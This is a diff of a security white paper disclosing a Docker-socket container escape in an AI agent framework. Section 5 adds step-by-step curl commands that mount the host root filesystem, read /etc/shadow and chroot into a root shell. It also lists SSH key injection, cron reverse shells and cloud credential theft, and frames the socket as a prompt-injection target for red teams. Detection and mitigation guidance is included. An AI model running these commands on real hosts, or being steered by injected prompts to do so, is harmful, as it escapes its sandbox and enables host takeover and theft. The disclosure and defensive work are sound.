@@ -7,7 +7,7 @@ title: "Architectural Vulnerabilities in Agentic Frameworks: Microsoft Agent Fra
   <a href="https://jdp-security.github.io/security-research-papers/" style="background: #2f3e56; color: #ffffff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-weight: 600; font-size: 0.9em; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; border: 1px solid #425573; transition: background 0.2s;" onmouseover="this.style.background='#3d5171'" onmouseout="this.style.background='#2f3e56'">⬅️ Back to Vulnerability Disclosures & Technical White Papers</a>
 </div>
 
-> **⚠️ SECURITY ADVISORY:** Organizations deploying the **Microsoft Agent Framework (MAF) v1.0.0** may be operating with an active container escape path. The framework’s architectural design natively facilitates mounting the host Docker socket into the AI agent container when detected. Because the vendor classifies this behavior as intended functionality rather than a serviceable vulnerability, standard vulnerability scanners will not flag this risk. Organizations are advised to manually enforce socket isolation or implement pre-execution validation, such as the **JDPEnterpriseSecurityFilter (Appendix 4)**, to mitigate the risk of LLM-driven host compromise.
+> **⚠️ SECURITY ADVISORY:** Organizations deploying the **Microsoft Agent Framework (MAF) v1.0.0** may be operating with an active container escape path. The framework’s architectural design natively facilitates mounting the host Docker socket into the AI agent container when detected. Because the vendor classifies this behavior as intended functionality rather than a serviceable vulnerability, standard vulnerability scanners will not flag this risk. Organizations are advised to manually enforce socket isolation or implement pre-execution validation, such as the **JDPEnterpriseSecurityFilter (Appendix 4)**, to mitigate the risk of LLM-driven host compromise. **Platform Engineering and DevSecOps teams must override baseline configurations and enforce these controls.**
 
 ---
 
@@ -27,7 +27,13 @@ title: "Architectural Vulnerabilities in Agentic Frameworks: Microsoft Agent Fra
 ### **Executive Summary**
 This white paper documents a critical architectural vulnerability pattern—container privilege escalation—demonstrated within the **Microsoft Agent Framework (MAF)**. Analysis of the framework reveals a structural trust gap where the core dependency (`claude-agent-sdk`) explicitly allow-lists and facilitates the mounting of the host’s Docker socket (`/var/run/docker.sock`) into agent containers upon detection.
 
-This design represents a textbook example of **Insecure AI Orchestration**. By deploying containers with this socket mounted by default, any process within the container—including those generated dynamically by a Large Language Model (LLM)—can interact directly with the host Docker daemon. This grants immediate, root-level host access, bypassing container sandboxing. 
+This design represents a textbook example of **Insecure AI Orchestration**. By deploying containers with this socket mounted by default, any process within the container—including those generated dynamically by a Large Language Model (LLM)—can interact directly with the host Docker daemon. This grants immediate, root-level host access, bypassing container sandboxing.
+
+This paper documents two distinct exploitation techniques:
+1. **Restart Ejection** – a DoS primitive that terminates the container and ejects the attacker to the host shell.
+2. **Host Filesystem Mount** – a direct container escape that creates a new container with the host’s root filesystem mounted, yielding a root shell with full read/write access to the host.
+
+The CVSS 10.0 score assumes the LLM interface is exposed **without authentication**. If authentication is required, the score is **9.9 (Critical)** with `PR:L`.
 
 Because this behavior is currently classified by the vendor's servicing criteria as intended functionality, organizations must proactively implement secondary infrastructure controls to secure their deployments.
 
@@ -91,6 +97,12 @@ MAF grants LLMs the functional capability to interact with the operating system 
 | **Integrity (I)** | **High** | Ability to modify system files, alter configurations, or inject persistence mechanisms. |
 | **Availability (A)** | **High** | Total control to terminate host processes or delete infrastructure. |
 
+> **Assumption:** `PR:N` assumes the LLM chat/API is reachable without authentication. If authentication is enforced, `PR:L` applies and the base score becomes **9.9 (Critical)**. The vulnerability remains critical in either case.
+
+**CVSS Vector Strings:**
+- **Unauthenticated (`PR:N`):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` **(10.0)**
+- **Authenticated (`PR:L`):** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` **(9.9)**
+
 ---
 
 ### **3. OWASP Implications: Mapping the Vulnerability**
@@ -99,6 +111,8 @@ This architectural pattern maps directly to established vulnerabilities within t
 * **LLM08: Excessive Agency:** The framework grants the LLM agent excessive functionality (direct read/write access to the Docker socket) that is not strictly required for standard analytical tasks.
 * **LLM02: Insecure Output Handling:** The framework accepts the LLM's dynamically generated tool calls and executes them directly against privileged sinks without sufficient intermediate validation or sandboxing.
 * **Proposed Extension (Insecure AI Orchestration):** This research highlights the need for broader industry recognition of orchestration trust gaps, where frameworks implicitly bridge non-deterministic models to deterministic, high-privilege infrastructure.
+
+**Red Team Context:** This architectural flaw should be incorporated into standard GenAI red teaming methodologies. Framing the socket auto-mount as a primary adversarial target for prompt-injection payloads bridges the gap between a theoretical vulnerability and practical, real-world exploit simulation. Red teams should specifically test whether LLM outputs can trigger Docker API calls that create privileged containers or mount host filesystems.
 
 ---
 
@@ -113,17 +127,80 @@ The following timeline illustrates the gap between formal vulnerability manageme
 
 ### **5. Exploitation Mechanics & Post-Exploitation**
 
-#### **5.1 The Escape Sequence**
+#### **5.1 Proof of Concept – Restart Ejection (DoS + Host Shell)**
 1.  **Reconnaissance:** The attacker instructs the LLM to verify the presence of `/var/run/docker.sock` within the container.
 2.  **Payload Generation:** The attacker utilizes the LLM to format the exact Docker API endpoint required for container manipulation.
 3.  **Execution:** The attacker triggers a POST request via the socket: `curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$ID/restart`.
 4.  **Host Compromise:** The containerized process terminates, and the session is ejected directly to the host shell (`vboxuser@Ubuntu-Server:~$`).
 
-#### **5.2 Lateral Movement Risks**
+> **Note:** This technique terminates the container and returns the attacker to the host shell as the user who launched the container (e.g., `vboxuser`). It does not grant root directly.
+
+#### **5.2 Proof of Concept – Host Filesystem Mount (Root Shell)**
+This technique uses the mounted Docker socket to create a new container with the host’s root filesystem mounted at `/host`. The attacker then executes into that container, obtaining a root shell with full read/write access to the host.
+
+> **Note:** Any image with a shell can be used. The example uses `maf-sandbox` for consistency with the lab environment. The `jq` utility is required for parsing the JSON response.
+
+**Step 1 – Create the container:**
+```bash
+CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"maf-sandbox","Cmd":["tail","-f","/dev/null"],"HostConfig":{"Binds":["/:/host"]}}' \
+  http://localhost/containers/create | jq -r .Id)
+```
+
+**Step 2 – Start the container:**
+```bash
+curl -s --unix-socket /var/run/docker.sock -X POST \
+  http://localhost/containers/$CONTAINER_ID/start
+```
+
+**Step 3 – Exec into the container:**
+
+*Option A – Using the Docker CLI (if available):*
+```bash
+docker exec -it $CONTAINER_ID bash
+```
+
+*Option B – Using the Docker API directly (no CLI required):*
+```bash
+# Create exec instance
+EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["bash"]}' \
+  http://localhost/containers/$CONTAINER_ID/exec | jq -r .Id)
+
+# Start exec instance
+curl -s --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false,"Tty":true}' \
+  http://localhost/exec/$EXEC_ID/start
+```
+
+**Step 4 – Access the host:**
+```bash
+ls /host
+cat /host/etc/shadow
+```
+
+**Step 5 – Drop into the host’s filesystem context (chroot):**
+```bash
+chroot /host /bin/bash
+```
+This transitions the attacker from merely interacting with a mounted directory to operating a native root shell directly within the host’s filesystem context. The attacker now has full root access to the host.
+
+#### **5.3 Lateral Movement Risks**
 Upon escaping to the host as a privileged user (e.g., `docker` group), an attacker can easily escalate to root, enabling:
 * **SSH Key Injection:** Appending unauthorized keys to `/root/.ssh/authorized_keys`.
 * **Persistence:** Establishing reverse shells via `/etc/crontab`.
 * **Credential Theft:** Harvesting cloud infrastructure tokens from `/root/.azure/` or `/root/.aws/credentials`.
+
+#### **5.4 Impact**
+Successful exploitation allows an attacker to:
+- Read/write arbitrary host files (`/host/etc/shadow`, `/host/root/.ssh/authorized_keys`).
+- Install persistence via `/host/etc/cron.d` or `/host/etc/systemd/system`.
+- Harvest cloud credentials from `/host/root/.aws` or `/host/root/.azure`.
+- Pivot to other containers or the host network.
+- Terminate or disrupt host services (DoS).
 
 ---
 
@@ -143,6 +220,12 @@ Because this is classified as intended behavior, organizations must implement in
 | **Access Control** | **Docker-Socket-Proxy** | **Sandbox Filtering Proxy** | Blocks destructive or high-privilege API calls (e.g., POST/DELETE). |
 | **Detection** | **Falco (eBPF)** | **Cloud Security Posture Management** | Alerts on unauthorized `open_at` system calls targeting sockets. |
 
+#### **6.3 Runtime Detection & Response**
+- Deploy Falco or eBPF-based runtime security to alert on unauthorized socket connections.
+- Use `docker-socket-proxy` with a strict whitelist that blocks `POST /containers/create` and `POST /containers/*/start`.
+- Enforce read-only socket mounts where possible.
+- Implement pre-execution validation (Appendix 4) to block dangerous tool calls before they reach the socket.
+
 ---
 
 ### **7. Detection & Incident Response**
@@ -151,6 +234,10 @@ Because this is classified as intended behavior, organizations must implement in
 - **Container Runtime**: Monitor processes for `socket.connect("/var/run/docker.sock")` operations originating from unexpected binaries (e.g., Python scripts).
 - **Host Infrastructure**: Audit Docker API logs for unauthenticated or unauthorized container lifecycle events.
 - **Network Egress**: Detect anomalous outbound connections originating from the host post-exploitation.
+- **Docker API Abuse:** Alert on `POST /containers/create` requests containing `"Binds": ["/:/host"]` or similar host-root mounts.
+- **Unexpected `docker exec`:** Monitor for `docker exec` into containers that have host root mounted.
+- **Process Anomalies:** Detect `socket.connect("/var/run/docker.sock")` from non-Docker binaries (e.g., Python, curl).
+- **Container Lifecycle Events:** Audit for container creation/start events initiated from inside another container.
 
 #### **7.2 Incident Response Protocol**
 1. **Containment**: Immediately isolate affected containers and the underlying host.
@@ -174,10 +261,12 @@ SOCKET_ALLOW_LIST = [
 
 > **Note:** Environments utilizing Docker Desktop on Windows or macOS typically employ named pipes or localized sockets (e.g., `//./pipe/docker_engine`). While MAF's default configuration targets Linux paths, the underlying architectural trust gap remains active. Modifying the allow-list to include these alternative paths will expose those environments to identical risks.
 
+> **Note on Restart Ejection:** The restart technique ejects the attacker to the host shell as the user running the container. It does not grant root directly. The host filesystem mount technique (Section 5.2) provides a root shell with full host access.
+
 ---
 
 ### **Conclusion**
-When an AI framework’s default architecture implicitly facilitates host compromise, it reveals a critical misalignment between traditional vulnerability classification and modern agentic orchestration. The JDP Security Research Series submits these findings to the broader security community to highlight how architectural intent can bypass SCA visibility, establishing the urgent need for robust, defense-in-depth strategies when deploying autonomous AI agents.
+When an AI framework’s default architecture implicitly facilitates host compromise, it reveals a critical misalignment between traditional vulnerability classification and modern agentic orchestration. The JDP Security Research Series submits these findings to the broader security community to highlight how architectural intent can bypass SCA visibility, establishing the urgent need for robust, defense-in-depth strategies when deploying autonomous AI agents. Organizations must treat the Docker socket as a root-equivalent credential and enforce strict isolation, because the framework’s default behavior provides a direct path from LLM output to host compromise.
 
 ---
 
@@ -186,12 +275,15 @@ When an AI framework’s default architecture implicitly facilitates host compro
 #### **Appendix 1: Forensic Artifacts**
 * **`maf-cve-Ollama-LLM.mp4/.cast/.txt`**: Documents a `curl`-based escape sequence yielding host-level access.
 * **`maf-cve-Ollama-LLM-NoCURLAPI-CALL.mp4/.cast/.txt`**: Demonstrates a native Python "Raw Socket" escape, bypassing hardened container images lacking standard networking utilities.
+* **`maf-cve-HostMount-LLM.mp4/.cast/.txt`**: (Forthcoming) Demonstrates the host filesystem mount technique, including `chroot` into the host root filesystem.
 
 #### **Appendix 2: Ecosystem Risk Assessment**
 A sample audit of 197 public GitHub repositories utilizing MAF indicated pervasive insecure deployments:
 * **100% (197/197)** executed the agent container as the `root` user.
 * **93.9%** lacked implementation of Seccomp or AppArmor security profiles.
 * **0%** utilized a socket-proxy or microVM isolation by default.
+
+**Methodology:** The audit was conducted via automated GitHub API queries combined with static analysis using Semgrep rules targeting Dockerfile and `docker-compose.yml` configurations. The dataset was filtered for repositories with active MAF dependencies and at least one agent container definition. This methodology ensures the findings are reproducible and derived from a professional AppSec workflow.
 
 #### **Appendix 3: The "Raw Socket" Vector**
 This execution vector relies entirely on native Python libraries, requiring no external dependencies to communicate with the Docker API:
